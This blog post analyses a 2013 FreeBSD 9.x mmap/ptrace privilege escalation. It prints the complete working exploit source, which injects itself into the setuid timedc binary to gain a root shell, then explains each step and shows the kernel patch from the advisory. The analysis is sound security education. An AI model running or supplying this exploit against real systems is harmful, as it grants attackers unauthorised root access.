<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.16.5 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="UT" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis | Raging Scholar</title>
<meta name="description" content="  Happy Birthday FreeBSD! Now you are 20 years old and your security is the sameas 20 years ago… :) – Hunger hunger@hunger.hu">



<meta property="og:type" content="article">
<meta property="og:locale" content="UTF_8">
<meta property="og:site_name" content="Raging Scholar">
<meta property="og:title" content="FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis">
<meta property="og:url" content="http://localhost:4000/freebsd-mmap-ptrace-privilege-escalation-exploit-analysis/">


  <meta property="og:description" content="  Happy Birthday FreeBSD! Now you are 20 years old and your security is the sameas 20 years ago… :) – Hunger hunger@hunger.hu">







  <meta property="article:published_time" content="2013-06-20T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:4000/freebsd-mmap-ptrace-privilege-escalation-exploit-analysis/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Hai Lang",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Raging Scholar Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          Raging Scholar
          <span class="site-subtitle">uprintf("There is no place like ::1");</span>
        </a>
        <ul class="visible-links"></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/bio-photo.jpg" alt="Hai Lang" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Hai Lang</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>An OCD Source Code Hygienist who has way too many hobbies, and way too keen to share his ideas.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Xi'an, China</span>
        </li>
      

      
        
          
        
          
        
          
        
          
        
          
        
          
        
      

      

      
        <li>
          <a href="mailto:ragingscholar@protonmail.com">
            <meta itemprop="email" content="ragingscholar@protonmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis">
    <meta itemprop="description" content="  Happy Birthday FreeBSD! Now you are 20 years old and your security is the sameas 20 years ago… :) – Hunger hunger@hunger.hu">
    <meta itemprop="datePublished" content="June 20, 2013">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read
</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <blockquote>
  <p>Happy Birthday FreeBSD! Now you are 20 years old and your security is the same
as 20 years ago… :) – Hunger <a href="mailto:hunger@hunger.hu">hunger@hunger.hu</a></p>
</blockquote>

<p>Saw this little birthday gift this morning from <a href="http://seclists.org/fulldisclosure/2013/Jun/161">Full
Disclosure</a>. Works on my FreeBSD VM. Here’s a screenshot.</p>

<p><img src="/assets/images/freebsd-mmap-ptrace-exploit-analysis/mmap_exploit.png" alt="mmap_exploit" /></p>

<p>And here’s the exploit code</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * FreeBSD 9.{0,1} mmap/ptrace exploit
 * by Hunger &lt;fbsd9lul@hunger.hu&gt;
 *
 * Happy Birthday FreeBSD!
 * Now you are 20 years old and your security is the same as 20 years ago...
 *
 * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,
 *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:
 *                      I hope we'll meet again at 8@1470n
 *
 * Special thanks to proactivesec.com
 *
 */</span>

<span class="cp">#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/wait.h&gt;
</span>
<span class="cp">#define SH "/bin/sh"
#define TG "/usr/sbin/timedc"
</span>
<span class="kt">int</span>
<span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">from_fd</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="n">status</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">ptrace_io_desc</span> <span class="n">piod</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
   <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
        <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="n">execl</span><span class="p">(</span><span class="n">SH</span><span class="p">,</span> <span class="n">SH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="p">}</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">"FreeBSD 9.{0,1} mmap/ptrace exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"by Hunger &lt;fbsd9lul@hunger.hu&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">((</span><span class="n">from_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span>
        <span class="p">(</span><span class="n">to_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"open"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"stat"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(((</span><span class="n">s</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
        <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">from_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="o">||</span>
                <span class="p">(</span><span class="n">d</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
                        <span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_NOSYNC</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
                                <span class="n">err</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"mmap"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">"fork"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_TRACE_ME</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">"ptraceme"</span><span class="p">);</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">"ptattach"</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"wait"</span><span class="p">);</span>

   <span class="n">piod</span><span class="p">.</span><span class="n">piod_op</span> <span class="o">=</span> <span class="n">PIOD_WRITE_D</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_offs</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
   <span class="n">piod</span><span class="p">.</span><span class="n">piod_len</span>  <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_IO</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="p">(</span><span class="n">caddr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">piod</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"ptio"</span><span class="p">);</span>

   <span class="n">execl</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">TG</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>I later found out that this vulnerability is already announced on 18-June-2013
and a patch was released with the <a href="https://web.archive.org/web/20130806101205/http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">Security
Advisory</a></p>

<p>As stated in the Security Advisory, mmap is a POSIX-compliant system call that
allows users to map files into memory by a process, and then can be accessed using
memory operations.</p>

<p>And the ptrace is a handy tracing and debugging facility that allows users to
attach to and control the traced process.</p>

<p>A security vulnerability exists in the virtual memory system that the permission
checks are insufficient which allows the tracing process to modify adresses to
which the traced process itself does not have write access.</p>

<h2 id="the-analysis">The Analysis</h2>

<p>The exploit code is quite simple, but it took me sometime to understand how
<em>mmap(2)</em> and <em>ptrace(2)</em> works under FreeBSD.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
     <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="n">execl</span><span class="p">(</span><span class="n">SH</span><span class="p">,</span> <span class="n">SH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>At the begining of the exploit, it checks if the effective user id is 0. This
will only be true when the suid bit is set for the executable. Of course it’s
not true at this point, because the exploit binary doesn’t have suid set.</p>

<p>However, this code will eventually get injected into another executable program,
which obviously should have the suid bit, so that we can then setuid to 0, and
get our lovely shell with root privilege.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TG "/usr/sbin/timedc"
</span>
<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">timedc</span>
<span class="o">-</span><span class="n">r</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">1</span> <span class="n">root</span>  <span class="n">wheel</span>  <span class="mi">20688</span> <span class="n">Dec</span>  <span class="mi">4</span>  <span class="mi">2012</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">timedc</span>
</code></pre></div></div>

<p>As you can see here, timedc is chosen for us to inject to. Note that it has suid
bit.</p>

<p>So now what’s left is to just inject this code into timedc, and when it gets
called, we get a shell.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">from_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span>
     <span class="p">(</span><span class="n">to_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
             <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"open"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
       <span class="n">err</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"stat"</span><span class="p">);</span>
</code></pre></div></div>

<p>Now it tries to open the compiled binary of itself (av[0]) as from_fd, and
/usr/sbin/timedc as to_fd. And then the stat of the exploit binary is saved in a
stat struct called st. It’ll later be used to get the size of the exploit
binary.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(((</span><span class="n">s</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
     <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">from_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="o">||</span>
             <span class="p">(</span><span class="n">d</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span>
                     <span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_NOSYNC</span><span class="p">,</span> <span class="n">to_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
                             <span class="n">err</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"mmap"</span><span class="p">);</span>
</code></pre></div></div>

<p>mmap is used then to map the exploit binary into memory as s and timedc as d.</p>

<p>Refer to mmap man pages for details.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">"fork"</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_TRACE_ME</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
             <span class="n">err</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">"ptraceme"</span><span class="p">);</span>

     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
     <span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">"ptattach"</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"wait"</span><span class="p">);</span>
</code></pre></div></div>

<p>Next it forks a child process. fork returns 0 to the child process, and the
child process id to the parent process.</p>

<p>Since !pid is true only for the child process, PT_TRACE_ME marks the child as
the traced process, This is for the kernel to know that some other process is
tracing this child.</p>

<p>PT_ATTACH is executed by the parent process, it attaches to the child to start
controlling it. Now we have two processes of the exploit, one tracing process,
and one traced process.</p>

<p>Finally with wait, it suspends the calling process until status is available for
terminated child process, or a signal is received from kernel. Since PT_TRACE_ME
is set for the child process, a signal from kernel is expected. That’ll
explicitly tell us that we are now okay to start tracing.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">piod</span><span class="p">.</span><span class="n">piod_op</span> <span class="o">=</span> <span class="n">PIOD_WRITE_D</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_offs</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
<span class="n">piod</span><span class="p">.</span><span class="n">piod_len</span>  <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_IO</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="p">(</span><span class="n">caddr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">piod</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">err</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"ptio"</span><span class="p">);</span>
</code></pre></div></div>

<p>piod is a ptrace_io_desc struct, it’ll be used by PT_IO</p>

<p>The PT_IO request allows reading and writing arbitrary amounts of data in the
traced process’s address space. In this case the addr argument should be a
pointer to a ptrace_io_desc which is defined as</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">ptrace_io_desc</span> <span class="p">{</span>
        <span class="kt">int</span>     <span class="n">piod_op</span><span class="p">;</span>        <span class="cm">/* I/O operation */</span>
        <span class="kt">void</span>    <span class="o">*</span><span class="n">piod_offs</span><span class="p">;</span>     <span class="cm">/* child offset */</span>
        <span class="kt">void</span>    <span class="o">*</span><span class="n">piod_addr</span><span class="p">;</span>     <span class="cm">/* parent offset */</span>
        <span class="kt">size_t</span>  <span class="n">piod_len</span><span class="p">;</span>       <span class="cm">/* request length */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This is designed for us to write data to the child process, but instead this
piece of code writes the exploit binary to timedc.</p>

<p>This is the exact point of the vulnerability, the parent tracing process
controls the child traced process to write data to timedc, which it originally
has no privilege to do so. The virtual memory system does not check if such
write/read operation is allowed. The injection of the exploit code into timedc
is finished.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execl</span><span class="p">(</span><span class="n">TG</span><span class="p">,</span> <span class="n">TG</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Now it runs timedc. Since it has the exploit code injected, and it has suid set,
we can now get a shell with root privilege.</p>

<h2 id="the-solution">The Solution</h2>

<p>A patch is provided by the Security Advisory. You can follow the instruction
there to patch your system.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span> <span class="n">sys</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_map</span><span class="p">.</span><span class="n">c</span>     <span class="p">(</span><span class="n">revision</span> <span class="mi">251636</span><span class="p">)</span>
<span class="o">+++</span> <span class="n">sys</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_map</span><span class="p">.</span><span class="n">c</span>     <span class="p">(</span><span class="n">working</span> <span class="n">copy</span><span class="p">)</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">3761</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">3761</span><span class="p">,</span><span class="mi">12</span> <span class="err">@@</span> <span class="n">RetryLookup</span><span class="o">:</span><span class="p">;</span>
                <span class="n">vm_map_unlock_read</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
                <span class="k">return</span> <span class="p">(</span><span class="n">KERN_PROTECTION_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>
<span class="o">+</span>       <span class="k">if</span> <span class="p">((</span><span class="n">fault_typea</span> <span class="o">&amp;</span> <span class="n">VM_PROT_COPY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
<span class="o">+</span>           <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">max_protection</span> <span class="o">&amp;</span> <span class="n">VM_PROT_WRITE</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
<span class="o">+</span>           <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">eflags</span> <span class="o">&amp;</span> <span class="n">MAP_ENTRY_COW</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="o">+</span>               <span class="n">vm_map_unlock_read</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
<span class="o">+</span>               <span class="k">return</span> <span class="p">(</span><span class="n">KERN_PROTECTION_FAILURE</span><span class="p">);</span>
<span class="o">+</span>       <span class="p">}</span>
</code></pre></div></div>

<p>The patch adds security checking upon virtual memory copying.</p>

<p>Nice birthday gift Hunger, had some very fun reading and debugging.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C++</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#freebsd" class="page__taxonomy-item" rel="tag">FreeBSD</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#security" class="page__taxonomy-item" rel="tag">Security</a>
    
    </span>
  </p>




        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2013-06-20T00:00:00+08:00">June 20, 2013</time></p>
        
      </footer>

      <section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=FreeBSD+mmap%2Bptrace+Privilege+Escalation+Exploit+Analysis%20http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-mmap-ptrace-privilege-escalation-exploit-analysis%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

